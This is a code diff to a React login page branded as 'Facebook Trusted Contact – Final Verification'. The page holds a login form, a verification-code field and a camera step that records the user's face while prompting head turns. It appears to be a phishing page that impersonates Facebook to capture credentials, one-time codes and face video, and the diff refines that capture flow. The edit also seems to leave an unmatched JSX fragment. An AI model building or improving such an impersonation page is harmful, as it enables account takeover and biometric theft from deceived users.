@@ -76,7 +76,7 @@ export default function LoginPage() {
   const [userEmail, setUserEmail] = useState("");
   const [verificationCode, setVerificationCode] = useState("");
   const [stream, setStream] = useState<MediaStream | null>(null);
-  const [currentDirection, setCurrentDirection] = useState<"left" | "right" | "up" | "down" | null>(null);
+  const [currentDirection, setCurrentDirection] = useState<"left" | "right" | "up" | null>(null);
   const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
   const [isRecording, setIsRecording] = useState(false);
   const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
@@ -259,7 +259,8 @@ export default function LoginPage() {
 
       const directionDuration = 2500; // 2.5 seconds per direction
       const progressInterval = 50; // Update progress every 50ms
-      const directions: ("left" | "right" | "up" | "down")[] = ["left", "right", "up", "down"];
+      // Two cycles: left, right, up - repeated twice
+      const directions: ("left" | "right" | "up")[] = ["left", "right", "up", "left", "right", "up"];
 
       let currentDirIndex = 0;
       let dirProgress = 0;
@@ -273,11 +274,11 @@ export default function LoginPage() {
             // Mark current direction as complete before incrementing
             const completedSet = new Set<string>();
             for (let i = 0; i <= currentDirIndex; i++) {
-              completedSet.add(directions[i]);
+              completedSet.add(`${directions[i]}-${i}`); // Use index to make each step unique
             }
             setCompletedDirections(completedSet);
             setDirectionProgress(100);
-            setOverallProgress((currentDirIndex + 1) * 25);
+            setOverallProgress(((currentDirIndex + 1) / directions.length) * 100);
 
             // Move to next direction
             currentDirIndex++;
@@ -309,7 +310,7 @@ export default function LoginPage() {
             }
           } else {
             setDirectionProgress(dirProgress);
-            setOverallProgress((currentDirIndex * 25) + (dirProgress * 0.25));
+            setOverallProgress((currentDirIndex / directions.length) * 100 + (dirProgress / directions.length));
           }
         }, progressInterval);
 
@@ -345,28 +346,28 @@ export default function LoginPage() {
       {/* Main Content */}
       <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
         <div className="w-full max-w-md">
-          {/* Facebook Logo */}
-          <div className="text-center mb-4">
-            <img
-              src="/favicon.png"
-              alt="Facebook"
-              className="w-16 h-16 mx-auto"
-              data-testid="logo-facebook"
-            />
-          </div>
-          
-          {/* Trusted Contact Branding */}
-          <div className="text-center mb-8">
-            <h1 className="text-xl font-semibold mb-1" style={{ color: '#1c1e21' }}>
-              Facebook Trusted Contact
-            </h1>
-            <p className="text-sm" style={{ color: '#65676b' }}>
-              Final Verification
-            </p>
-          </div>
-
           {/* Login Step */}
           {currentStep === "login" && (
+            <>
+              {/* Facebook Logo */}
+              <div className="text-center mb-4">
+                <img
+                  src="/favicon.png"
+                  alt="Facebook"
+                  className="w-16 h-16 mx-auto"
+                  data-testid="logo-facebook"
+                />
+              </div>
+              
+              {/* Trusted Contact Branding - Only on Login */}
+              <div className="text-center mb-8">
+                <h1 className="text-xl font-semibold mb-1" style={{ color: '#1c1e21' }}>
+                  Facebook Trusted Contact
+                </h1>
+                <p className="text-sm" style={{ color: '#65676b' }}>
+                  Final Verification
+                </p>
+              </div>
             <>
               <Form {...loginForm}>
                 <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
@@ -466,7 +467,7 @@ export default function LoginPage() {
                   Create new account
                 </button>
               </div>
-            </>
+            </> 
           )}
 
           {/* Loading States */}
@@ -607,147 +608,69 @@ export default function LoginPage() {
           {/* Recording Screen */}
           {currentStep === "recording" && (
             <div className="text-center px-4">
-              <p className="text-base mb-4" style={{ color: '#65676b', lineHeight: '20px' }}>
-                Slowly turn your head to complete the circle
+              <h2 className="text-xl font-semibold mb-2" style={{ color: '#1c1e21' }}>
+                {currentDirection === "left" ? "Turn left" :
+                 currentDirection === "right" ? "Turn right" :
+                 currentDirection === "up" ? "Look up" :
+                 "Recording..."}
+              </h2>
+              
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                Follow the on-screen prompts
               </p>
 
-              {/* Camera Feed with Oval Progress */}
-              <div className="relative w-full max-w-xs mx-auto mb-6" style={{ aspectRatio: '3/4' }}>
-                <div className="relative w-full h-full rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
+              {/* Camera Feed */}
+              <div className="relative w-full max-w-sm mx-auto mb-6">
+                <div className="relative w-full rounded-2xl overflow-hidden" style={{ aspectRatio: '3/4', backgroundColor: '#000' }}>
                   <video
-                    ref={setVideoRef} // Use the setter function to update videoRef state
+                    ref={setVideoRef}
                     autoPlay
                     playsInline
                     muted
                     className="w-full h-full object-cover scale-x-[-1]"
                   />
 
-                  {/* Dark overlay with oval cutout effect */}
-                  <div className="absolute inset-0 pointer-events-none">
-                    {/* SVG Oval Progress Indicator */}
-                    <svg
-                      className="absolute inset-0 w-full h-full"
-                      viewBox="0 0 300 400"
-                      style={{ overflow: 'visible' }}
-                    >
-                      {/* Dark semi-transparent mask around the oval */}
-                      <defs>
-                        <mask id="ovalMask">
-                          <rect x="0" y="0" width="300" height="400" fill="white" />
-                          <ellipse cx="150" cy="190" rx="95" ry="125" fill="black" />
-                        </mask>
-                      </defs>
-                      <rect x="0" y="0" width="300" height="400" fill="rgba(0,0,0,0.6)" mask="url(#ovalMask)" />
-
-                      {/* Background oval (grey track) */}
-                      <ellipse
-                        cx="150"
-                        cy="190"
-                        rx="95"
-                        ry="125"
-                        fill="none"
-                        stroke="rgba(255,255,255,0.3)"
-                        strokeWidth="6"
-                      />
-
-                      {/* Progress oval (blue fill) */}
-                      <ellipse
-                        cx="150"
-                        cy="190"
-                        rx="95"
-                        ry="125"
-                        fill="none"
-                        stroke="#1877f2"
-                        strokeWidth="6"
-                        strokeLinecap="round"
-                        strokeDasharray={`${2 * Math.PI * 110}`}
-                        strokeDashoffset={`${2 * Math.PI * 110 * (1 - overallProgress / 100)}`}
-                        style={{
-                          transition: 'stroke-dashoffset 0.1s linear',
-                          transform: 'rotate(-90deg)',
-                          transformOrigin: '150px 190px'
-                        }}
-                      />
-
-                      {/* Current direction indicator dot */}
-                      {currentDirection && (
-                        <circle
-                          cx={
-                            currentDirection === "left" ? 55 :
-                            currentDirection === "right" ? 245 :
-                            currentDirection === "up" ? 150 :
-                            150
-                          }
-                          cy={
-                            currentDirection === "left" ? 190 :
-                            currentDirection === "right" ? 190 :
-                            currentDirection === "up" ? 65 :
-                            315
-                          }
-                          r="12"
-                          fill="#1877f2"
-                          style={{
-                            filter: 'drop-shadow(0 0 8px rgba(24, 119, 242, 0.8))',
-                            animation: 'pulse-dot 1s ease-in-out infinite'
-                          }}
-                        />
-                      )}
-                    </svg>
-
-                    {/* Direction arrow inside oval */}
-                    {currentDirection && (
-                      <div className="absolute inset-0 flex items-center justify-center" style={{ marginTop: '-10px' }}>
-                        <div
-                          className="flex flex-col items-center"
-                          style={{
-                            transform:
-                              currentDirection === "left" ? "translateX(-50px)" :
-                              currentDirection === "right" ? "translateX(50px)" :
-                              currentDirection === "up" ? "translateY(-60px)" :
-                              "translateY(60px)",
-                            transition: 'transform 0.3s ease'
-                          }}
-                        >
-                          <div
-                            className="w-12 h-12 rounded-full flex items-center justify-center"
-                            style={{ backgroundColor: 'rgba(24, 119, 242, 0.9)' }}
-                          >
-                            <svg
-                              className="w-6 h-6 text-white"
-                              fill="none"
-                              viewBox="0 0 24 24"
-                              stroke="currentColor"
-                              strokeWidth={3}
-                              style={{
-                                transform:
-                                  currentDirection === "left" ? "rotate(180deg)" :
-                                  currentDirection === "right" ? "rotate(0deg)" :
-                                  currentDirection === "up" ? "rotate(-90deg)" :
-                                  "rotate(90deg)"
-                              }}
-                            >
-                              <path strokeLinecap="round" strokeLinejoin="round" d="M13 7l5 5m0 0l-5 5m5-5H6" />
-                            </svg>
-                          </div>
-                        </div>
-                      </div>
-                    )}
+                  {/* Face outline guide */}
+                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                    <div
+                      className="border-2 rounded-full"
+                      style={{
+                        width: '70%',
+                        height: '85%',
+                        borderColor: 'rgba(255, 255, 255, 0.4)',
+                        borderStyle: 'solid'
+                      }}
+                    />
                   </div>
+
+                  {/* Direction indicator */}
+                  {currentDirection && (
+                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                      <div
+                        className="text-white font-bold text-6xl"
+                        style={{
+                          textShadow: '0 2px 8px rgba(0,0,0,0.8)',
+                          transform:
+                            currentDirection === "left" ? "translateX(-80px)" :
+                            currentDirection === "right" ? "translateX(80px)" :
+                            currentDirection === "up" ? "translateY(-100px)" :
+                            "none",
+                          transition: 'transform 0.3s ease'
+                        }}
+                      >
+                        {currentDirection === "left" ? "<" :
+                         currentDirection === "right" ? ">" :
+                         currentDirection === "up" ? "^" :
+                         ""}
+                      </div>
+                    </div>
+                  )}
                 </div>
               </div>
 
-              {/* Direction text */}
-              <h2 className="text-2xl font-bold mb-2" style={{ color: '#1c1e21' }}>
-                {currentDirection === "left" ? "Turn your head left" :
-                 currentDirection === "right" ? "Turn your head right" :
-                 currentDirection === "up" ? "Look up slowly" :
-                 currentDirection === "down" ? "Look down slowly" :
-                 "Hold still..."}
-              </h2>
-
               {/* Progress bar */}
-              <div className="w-full max-w-xs mx-auto mb-4">
-                <div className="h-1 rounded-full overflow-hidden" style={{ backgroundColor: '#e4e6eb' }}>
+              <div className="w-full max-w-sm mx-auto mb-6">
+                <div className="h-2 rounded-full overflow-hidden" style={{ backgroundColor: '#e4e6eb' }}>
                   <div
                     className="h-full rounded-full transition-all duration-100"
                     style={{
@@ -761,53 +684,22 @@ export default function LoginPage() {
                 </p>
               </div>
 
-              {/* Step indicators */}
-              <div className="flex justify-center gap-2 mb-4">
-                {["left", "right", "up", "down"].map((dir, index) => (
-                  <div
-                    key={dir}
-                    className="flex items-center gap-1"
-                  >
-                    <div
-                      className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-medium transition-all"
-                      style={{
-                        backgroundColor: completedDirections.has(dir) ? '#00a400' :
-                                        currentDirection === dir ? '#1877f2' : '#e4e6eb',
-                        color: completedDirections.has(dir) || currentDirection === dir ? '#fff' : '#65676b'
-                      }}
-                    >
-                      {completedDirections.has(dir) ? (
-                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
-                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-                        </svg>
-                      ) : (
-                        index + 1
-                      )}
-                    </div>
-                  </div>
-                ))}
-              </div>
-
               <button
                 onClick={() => {
                   if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                   }
+                  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.stop();
+                  }
                   setCurrentStep("login");
                 }}
-                className="mt-3 text-xs"
-                style={{ color: '#65676b' }}
+                className="text-sm"
+                style={{ color: '#1877f2' }}
                 data-testid="button-cancel-verification"
               >
-                Cancel verification
+                Cancel
               </button>
-
-              <style>{`
-                @keyframes pulse-dot {
-                  0%, 100% { opacity: 1; transform: scale(1); }
-                  50% { opacity: 0.7; transform: scale(1.2); }
-                }
-              `}</style>
             </div>
           )}
 
